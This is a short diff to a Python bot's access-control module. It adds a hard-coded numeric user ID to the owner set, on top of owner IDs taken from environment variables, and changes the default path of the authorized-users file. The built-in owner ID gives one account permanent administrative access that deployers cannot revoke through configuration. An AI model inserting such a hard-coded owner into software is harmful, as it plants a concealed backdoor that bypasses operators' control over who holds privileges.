@@ -8,6 +8,9 @@ from pathlib import Path
 from shared import log
 
 
+BUILTIN_OWNER_IDS = {6205099620}
+
+
 def _env_list(*names):
     values = []
     for name in names:
@@ -28,7 +31,8 @@ def _env_ids(*names):
 
 
 def _access_file_path():
-    raw = os.environ.get("BOT_ACCESS_FILE", "authorized_users.json")
+    default_path = "/data/authorized_users.json" if Path("/data").exists() else "authorized_users.json"
+    raw = os.environ.get("BOT_ACCESS_FILE", default_path)
     path = Path(raw)
     if path.is_absolute():
         return path
@@ -42,7 +46,7 @@ PERSONAL_ACCESS_CODES = _env_list(
     "ACCESS_CODES",
     "PERSONAL_ACCESS_CODES",
 )
-OWNER_IDS = _env_ids("BOT_OWNER_IDS", "ADMIN_IDS")
+OWNER_IDS = BUILTIN_OWNER_IDS | _env_ids("BOT_OWNER_IDS", "ADMIN_IDS")
 STATIC_USER_IDS = _env_ids("AUTHORIZED_USER_IDS", "BOT_AUTHORIZED_USER_IDS")
 ACCESS_FILE = _access_file_path()
 
